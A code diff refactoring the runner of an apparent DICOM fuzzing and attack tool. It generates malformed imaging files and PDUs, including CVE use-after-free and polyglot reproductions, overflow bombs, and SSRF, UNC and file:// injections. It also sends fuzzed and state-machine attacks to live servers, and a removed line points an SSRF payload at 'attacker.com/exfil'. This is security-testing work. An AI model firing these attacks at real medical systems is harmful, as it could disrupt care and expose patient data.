@@ -33,12 +33,14 @@ try:
         StateMachineAttacks, CVEAttacks, ProtocolFuzzer, AttackResult,
         SCAPY_AVAILABLE
     )
+    from . import deliver
 except ImportError:
     from attacks import (
         ParserAttacks, ProtocolAttacks, MemoryAttacks, LogicAttacks,
         StateMachineAttacks, CVEAttacks, ProtocolFuzzer, AttackResult,
         SCAPY_AVAILABLE
     )
+    import deliver
 
 __all__ = ['main', 'run_command']
 
@@ -78,61 +80,24 @@ def print_result(result: AttackResult, verbose: bool = False):
 def run_cve_attacks(args) -> int:
     """Run CVE-specific attack reproductions."""
     print("\n=== CVE Attack Patterns ===\n")
-    print("Testing CVE reproductions:")
-    print("  - CVE-2023-32135 (Use-After-Free DCM parsing)")
-    print("  - CVE-2024-24793 (Use-After-Free Meta Info)")
-    print("  - CVE-2024-24794 (Use-After-Free Sequences)")
-    print("  - CVE-2019-11687 (PEDICOM/ELFDICOM polyglot)")
-    print()
-    
+
     all_results = []
-    
-    # CVE-2023-32135
-    print("CVE-2023-32135: Use-After-Free in DCM File Parsing")
-    results = CVEAttacks.cve_2023_32135_sequence_uaf()
-    for result in results:
+    for result in CVEAttacks.all():
         print_result(result, args.verbose)
         all_results.append(result)
-    
-    # CVE-2024-24793
-    print("\nCVE-2024-24793: Use-After-Free in File Meta Information")
-    results = CVEAttacks.cve_2024_24793_duplicate_meta_tags()
-    for result in results:
-        print_result(result, args.verbose)
-        all_results.append(result)
-    
-    # CVE-2024-24794
-    print("\nCVE-2024-24794: Use-After-Free in Sequence Parsing")
-    results = CVEAttacks.cve_2024_24794_sequence_duplicates()
-    for result in results:
-        print_result(result, args.verbose)
-        all_results.append(result)
-    
-    # CVE-2019-11687
-    print("\nCVE-2019-11687: Executable Embedding (Polyglot Files)")
-    results = CVEAttacks.cve_2019_11687_polyglot()
-    for result in results:
-        print_result(result, args.verbose)
-        all_results.append(result)
-    
+
     print(f"\nTotal CVE test cases: {len(all_results)}")
-    
-    # Save to output if requested
+
     if args.output:
         os.makedirs(args.output, exist_ok=True)
         for result in all_results:
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(args.output, filename)
-            
-            # Add DICOM file wrapper
+            filepath = os.path.join(args.output, f"{result.name}.dcm")
             file_data = b'\x00' * 128 + b'DICM' + result.payload
-            
             with open(filepath, 'wb') as f:
                 f.write(file_data)
-            
             if args.verbose:
                 print(f"Saved: {filepath}")
-    
+
     return 0
 
 
@@ -244,15 +209,14 @@ def run_protocol_fuzzing(args) -> int:
     if not SCAPY_AVAILABLE:
         print("⚠ Scapy not available - skipping protocol fuzzing tests")
         print("  (This is optional, install with: pip install scapy)")
-        return 0  # Return success - Scapy is optional
-    
+        return 0
+
     if not args.target:
         print("ERROR: --target required (format: host:port)")
         return 1
-    
+
     print("\n=== Live Protocol Fuzzing ===\n")
-    
-    # Parse target
+
     try:
         host, port = args.target.rsplit(':', 1)
         port = int(port)
@@ -261,274 +225,173 @@ def run_protocol_fuzzing(args) -> int:
         print(f"ERROR: Invalid target format: {args.target}")
         print("Expected format: host:port (e.g., 192.168.1.100:11112)")
         return 1
-    
+
     print(f"Target: {host}:{port}")
     print(f"Running {args.count} fuzzed A-ASSOCIATE-RQ packets against server")
     print()
-    
+
     try:
-        fuzzer = ProtocolFuzzer(target, timeout=args.timeout)
-        
         interesting_count = 0
-        for i, result in enumerate(fuzzer.fuzz_association(count=args.count)):
-            if result.success:
-                interesting = result.metadata.get('interesting', False)
-                status = "!" if interesting else "✓"
-                print(f"{status} #{i+1}: {result.name}")
-                
-                if interesting:
-                    interesting_count += 1
-                    if args.verbose:
-                        print(f"  Mutation: {result.metadata.get('mutation')}")
-                        if result.response:
-                            print(f"  Response: {len(result.response)} bytes")
-                        else:
-                            print(f"  Response: None (timeout or connection closed)")
-            else:
+        for i, result in enumerate(ProtocolFuzzer.fuzz_association(count=args.count)):
+            if not result.payload:
                 print(f"✗ #{i+1}: {result.description}")
-        
+                continue
+
+            response = deliver.send_pdu(target, result.payload, timeout=args.timeout)
+            interesting = (
+                response is None or
+                len(response) == 0 or
+                (response and response[0] not in (0x02, 0x03, 0x07))
+            )
+            status = "!" if interesting else "✓"
+            print(f"{status} #{i+1}: {result.name}")
+
+            if interesting:
+                interesting_count += 1
+                if args.verbose:
+                    print(f"  Mutation: {result.metadata.get('mutation')}")
+                    if response:
+                        print(f"  Response: {len(response)} bytes")
+                    else:
+                        print(f"  Response: None (timeout or connection closed)")
+
         print(f"\nInteresting results: {interesting_count}/{args.count}")
-        
+
     except Exception as e:
         print(f"ERROR: Fuzzing failed: {e}")
         return 1
-    
+
     return 0
+
+
+def _save_corpus_file(result: AttackResult, output_dir: str) -> str:
+    """Save an AttackResult payload as a corpus file, return the path."""
+    # Protocol-level payloads use .bin, dataset payloads use .dcm
+    if result.category in ('protocol', 'state_machine', 'fuzzer'):
+        ext = '.bin'
+        file_data = result.payload
+    else:
+        ext = '.dcm'
+        if result.payload and not result.payload.startswith(b'DICM'):
+            file_data = b'\x00' * 128 + b'DICM' + result.payload
+        else:
+            file_data = result.payload
+
+    filepath = os.path.join(output_dir, f"{result.name}{ext}")
+    with open(filepath, 'wb') as f:
+        f.write(file_data)
+    return filepath
 
 
 def run_generate_corpus(args) -> int:
     """Generate fuzzing corpus files."""
     print("\n=== Generating Fuzzing Corpus ===\n")
-    
+
     output_dir = args.output or tempfile.mkdtemp(prefix='c_scare_corpus_')
     os.makedirs(output_dir, exist_ok=True)
-    
-    count = args.count
-    
+
     print(f"Output directory: {output_dir}")
     print(f"Generating test cases...")
     print()
-    
-    # Generate parser attacks manually with error handling
-    print("Parser attacks...")
-    
-    attacks = [
-        ("Invalid VR", lambda: ParserAttacks.invalid_vr('XX')),
-        ("Length overflow", lambda: ParserAttacks.length_overflow()),
-        ("Length underflow", lambda: ParserAttacks.length_underflow()),
-        ("Undefined length abuse", ParserAttacks.undefined_length_abuse),
-        ("Sequence bomb", lambda: ParserAttacks.sequence_bomb(10)),
-        # Skip tag_out_of_order - known to fail with 'Dataset' object has no attribute 'elements'
-        # ("Tag out of order", ParserAttacks.tag_out_of_order),
-        # Skip duplicate_tag - same issue
-        # ("Duplicate tag", ParserAttacks.duplicate_tag),
-        ("Null in string", ParserAttacks.null_in_string),
-        ("Format string", ParserAttacks.format_string_injection),
-        ("Path traversal", ParserAttacks.path_traversal_in_string),
-        ("Unicode expansion", ParserAttacks.unicode_expansion),
+
+    categories = [
+        ('Parser attacks', ParserAttacks),
+        ('Memory attacks', MemoryAttacks),
+        ('Logic attacks', LogicAttacks),
+        ('CVE attacks', CVEAttacks),
+        ('Protocol attacks', ProtocolAttacks),
+        ('State machine attacks', StateMachineAttacks),
     ]
-    
+
     results = []
-    for name, attack_fn in attacks:
-        try:
-            result = attack_fn()
-            
-            # Save to file
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(output_dir, filename)
-            
-            # Add DICOM file wrapper if not already present
-            if not result.payload.startswith(b'DICM'):
-                file_data = b'\x00' * 128 + b'DICM' + result.payload
-            else:
-                file_data = result.payload
-            
-            with open(filepath, 'wb') as f:
-                f.write(file_data)
-            
-            filesize = len(result.payload)
-            print(f"  {os.path.basename(filepath):30s} {filesize:>8} bytes  {result.description}")
-            results.append(result)
-        except Exception as e:
-            print(f"  ✗ {name:30s}  SKIPPED  {e}")
-    
-    # Generate memory attacks
-    print("\nMemory attacks...")
-    memory_attacks = [
-        ("Pixel overflow", MemoryAttacks.pixel_dimension_overflow),
-        # Skip fragment_count_bomb - EncapsulatedPixelData API issue
-        # ("Fragment bomb", MemoryAttacks.fragment_count_bomb),
-        # ("Offset table bomb", MemoryAttacks.offset_table_bomb),
-        ("VM bomb", MemoryAttacks.value_multiplicity_bomb),
-        ("Oversized string", MemoryAttacks.oversized_string_vr),
-        ("Max length field", MemoryAttacks.maximum_length_field),
-        ("OB overflow", MemoryAttacks.ob_vr_overflow),
-        ("OW overflow", MemoryAttacks.ow_vr_overflow),
-        ("LUT overflow", MemoryAttacks.lut_overflow),
-        # Skip encapsulated_frame_overflow - EncapsulatedPixelData API issue
-        # ("Frame overflow", MemoryAttacks.encapsulated_frame_overflow),
-    ]
-    
-    for name, attack_fn in memory_attacks:
-        try:
-            result = attack_fn()
-            
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(output_dir, filename)
-            
-            if not result.payload.startswith(b'DICM'):
-                file_data = b'\x00' * 128 + b'DICM' + result.payload
-            else:
-                file_data = result.payload
-            
-            with open(filepath, 'wb') as f:
-                f.write(file_data)
-            
-            filesize = len(result.payload)
-            print(f"  {os.path.basename(filepath):30s} {filesize:>8} bytes  {result.description}")
-            results.append(result)
-        except Exception as e:
-            print(f"  ✗ {name:30s}  SKIPPED  {e}")
-    
+    for label, cls in categories:
+        print(f"{label}...")
+        for result in cls.all():
+            try:
+                filepath = _save_corpus_file(result, output_dir)
+                filesize = len(result.payload)
+                print(f"  {os.path.basename(filepath):30s} {filesize:>8} bytes  {result.description}")
+                results.append(result)
+            except Exception as e:
+                print(f"  ✗ {result.name:30s}  SKIPPED  {e}")
+
     print(f"\nCorpus saved to: {output_dir}")
     print(f"Total files: {len(results)}")
-    
+
     return 0
 
 
 def run_parser_attacks(args) -> int:
     """Run parser attack tests."""
     print("\n=== Parser Attacks ===\n")
-    
-    attacks = [
-        ("Invalid VR", lambda: ParserAttacks.invalid_vr('XX')),
-        ("Length overflow", lambda: ParserAttacks.length_overflow()),
-        ("Length underflow", lambda: ParserAttacks.length_underflow()),
-        ("Undefined length abuse", ParserAttacks.undefined_length_abuse),
-        ("Sequence bomb (10)", lambda: ParserAttacks.sequence_bomb(10)),
-        ("Tag out of order", ParserAttacks.tag_out_of_order),
-        ("Duplicate tag", ParserAttacks.duplicate_tag),
-        ("Null in string", ParserAttacks.null_in_string),
-        ("Format string injection", ParserAttacks.format_string_injection),
-        ("Path traversal", ParserAttacks.path_traversal_in_string),
-        ("Unicode expansion", ParserAttacks.unicode_expansion),
-    ]
-    
+
     results = []
-    for name, attack_fn in attacks:
+    for result in ParserAttacks.all():
         try:
-            result = attack_fn()
             print_result(result, args.verbose)
             results.append(result)
         except Exception as e:
-            print(f"✗ {name}: {e}")
-    
+            print(f"✗ {result.name}: {e}")
+
     print(f"\nTotal parser attack tests: {len(results)}")
-    
+
     if args.output:
         os.makedirs(args.output, exist_ok=True)
         for result in results:
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(args.output, filename)
-            
-            # Add DICOM file wrapper
+            filepath = os.path.join(args.output, f"{result.name}.dcm")
             file_data = b'\x00' * 128 + b'DICM' + result.payload
-            
             with open(filepath, 'wb') as f:
                 f.write(file_data)
-    
+
     return 0
 
 
 def run_protocol_attacks(args) -> int:
     """Run protocol-level attack tests."""
-    if not args.target:
-        print("ERROR: --target required for protocol attacks (format: host:port)")
-        return 1
-    
     print("\n=== Protocol Attacks ===\n")
-    
-    # These are static protocol malformations - don't need live connection
-    attacks = [
-        ("Malformed protocol version", lambda: ProtocolAttacks.malformed_protocol_version(0xFFFF)),
-        ("Oversized PDU", lambda: ProtocolAttacks.oversized_pdu(0x100000)),
-        ("Undersized PDU", ProtocolAttacks.undersized_pdu),
-        ("Invalid PDU type", lambda: ProtocolAttacks.invalid_pdu_type(0xFF)),
-        ("Truncated association", ProtocolAttacks.truncated_association),
-        ("P-DATA without association", ProtocolAttacks.pdata_without_association),
-        ("Overlong AE title", ProtocolAttacks.overlong_ae_title),
-        ("Null AE titles", ProtocolAttacks.null_ae_titles),
-        ("Missing application context", ProtocolAttacks.missing_application_context),
-        ("PDU length mismatch", lambda: ProtocolAttacks.pdu_length_mismatch(10000)),
-        ("Wrong context ID", lambda: ProtocolAttacks.wrong_context_id(255)),
-    ]
-    
+
     results = []
-    for name, attack_fn in attacks:
+    for result in ProtocolAttacks.all():
         try:
-            payload = attack_fn()
-            result = AttackResult(
-                name=name.lower().replace(' ', '_'),
-                category='protocol',
-                payload=payload,
-                description=name,
-                expected_behavior='Parser should handle malformed protocol',
-            )
             print_result(result, args.verbose)
             results.append(result)
         except Exception as e:
-            print(f"✗ {name}: {e}")
-    
+            print(f"✗ {result.name}: {e}")
+
     print(f"\nTotal protocol attack tests: {len(results)}")
-    
+
     if args.output:
         os.makedirs(args.output, exist_ok=True)
         for result in results:
-            filename = f"{result.name}.bin"
-            filepath = os.path.join(args.output, filename)
+            filepath = os.path.join(args.output, f"{result.name}.bin")
             with open(filepath, 'wb') as f:
                 f.write(result.payload)
-    
+
     return 0
 
 
 def run_logic_attacks(args) -> int:
     """Run logic attack tests."""
     print("\n=== Logic Attacks ===\n")
-    
-    attacks = [
-        ("Transfer syntax mismatch", LogicAttacks.transfer_syntax_mismatch),
-        ("SOP class mismatch", LogicAttacks.sop_class_mismatch),
-        ("Private creator missing", LogicAttacks.private_creator_missing),
-        ("URI SSRF", lambda: LogicAttacks.uri_ssrf('http://attacker.com/exfil')),
-        ("file:// URI injection", LogicAttacks.file_uri_injection),
-        ("UNC path injection", LogicAttacks.unc_path_injection),
-        ("data: URI script", LogicAttacks.data_uri_script),
-    ]
-    
+
     results = []
-    for name, attack_fn in attacks:
+    for result in LogicAttacks.all():
         try:
-            result = attack_fn()
             print_result(result, args.verbose)
             results.append(result)
         except Exception as e:
-            print(f"✗ {name}: {e}")
-    
+            print(f"✗ {result.name}: {e}")
+
     print(f"\nTotal logic attack tests: {len(results)}")
-    
+
     if args.output:
         os.makedirs(args.output, exist_ok=True)
         for result in results:
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(args.output, filename)
-            
-            # Add DICOM file wrapper if not already present
+            filepath = os.path.join(args.output, f"{result.name}.dcm")
             if not result.payload.startswith(b'DICM'):
                 file_data = b'\x00' * 128 + b'DICM' + result.payload
             else:
                 file_data = result.payload
-            
             with open(filepath, 'wb') as f:
                 f.write(file_data)
     
@@ -541,10 +404,9 @@ def run_state_machine_attacks(args) -> int:
         print("ERROR: --target required for state machine attacks (format: host:port)")
         print("Example: python -m c_scare state_machine_attacks --target 127.0.0.1:4242")
         return 1
-    
+
     print("\n=== State Machine Attacks ===\n")
-    
-    # Parse target
+
     try:
         host, port = args.target.rsplit(':', 1)
         port = int(port)
@@ -553,82 +415,56 @@ def run_state_machine_attacks(args) -> int:
         print(f"ERROR: Invalid target format: {args.target}")
         print("Expected format: host:port (e.g., 192.168.1.100:11112)")
         return 1
-    
+
     print(f"Target: {host}:{port}")
     print()
-    
-    try:
-        state_attacks = StateMachineAttacks(target)
-        
-        attacks = [
-            ("P-DATA before association", state_attacks.pdata_before_assoc),
-            ("A-RELEASE before association", state_attacks.release_before_assoc),
-            ("Double association", state_attacks.double_association),
-            ("A-RELEASE then P-DATA", state_attacks.release_then_pdata),
-            ("Incomplete fragment", state_attacks.incomplete_fragment),
-        ]
-        
-        results = []
-        for name, attack_fn in attacks:
-            try:
-                result = attack_fn()
-                print_result(result, args.verbose)
-                results.append(result)
-            except Exception as e:
-                print(f"✗ {name}: {e}")
-        
-        print(f"\nTotal state machine attack tests: {len(results)}")
-        
-    except Exception as e:
-        print(f"ERROR: State machine attacks failed: {e}")
-        return 1
-    
+
+    results = []
+    for result in StateMachineAttacks.all():
+        try:
+            steps = result.metadata.get('steps')
+            if steps:
+                responses = deliver.send_sequence(target, steps, timeout=args.timeout)
+                result.response = responses[-1] if responses else None
+            else:
+                result.response = deliver.send_pdu(target, result.payload, timeout=args.timeout)
+            result.success = True
+        except Exception as e:
+            result.success = False
+            result.description = f'Failed: {e}'
+
+        print_result(result, args.verbose)
+        results.append(result)
+
+    print(f"\nTotal state machine attack tests: {len(results)}")
     return 0
 
 
 def run_memory_attacks(args) -> int:
     """Run memory corruption attack tests."""
     print("\n=== Memory Attacks ===\n")
-    
-    attacks = [
-        ("Pixel dimension overflow", MemoryAttacks.pixel_dimension_overflow),
-        ("Fragment count bomb", MemoryAttacks.fragment_count_bomb),
-        ("Offset table bomb", MemoryAttacks.offset_table_bomb),
-        ("Value multiplicity bomb", MemoryAttacks.value_multiplicity_bomb),
-        ("Oversized string VR", lambda: MemoryAttacks.oversized_string_vr(0x10000)),
-        ("Maximum length field", MemoryAttacks.maximum_length_field),
-        ("OB VR overflow", MemoryAttacks.ob_vr_overflow),
-        ("OW VR overflow", MemoryAttacks.ow_vr_overflow),
-        ("LUT overflow", MemoryAttacks.lut_overflow),
-        ("Encapsulated frame overflow", MemoryAttacks.encapsulated_frame_overflow),
-    ]
-    
+
     results = []
-    for name, attack_fn in attacks:
+    for result in MemoryAttacks.all():
         try:
-            result = attack_fn()
             print_result(result, args.verbose)
             results.append(result)
         except Exception as e:
-            print(f"✗ {name}: {e}")
-    
+            print(f"✗ {result.name}: {e}")
+
     print(f"\nTotal memory attack tests: {len(results)}")
-    
+
     if args.output:
         os.makedirs(args.output, exist_ok=True)
         for result in results:
-            filename = f"{result.name}.dcm"
-            filepath = os.path.join(args.output, filename)
-            
-            # Add DICOM file wrapper if not already present
+            filepath = os.path.join(args.output, f"{result.name}.dcm")
             if not result.payload.startswith(b'DICM'):
                 file_data = b'\x00' * 128 + b'DICM' + result.payload
             else:
                 file_data = result.payload
-            
             with open(filepath, 'wb') as f:
                 f.write(file_data)
-    
+
     return 0
 
 
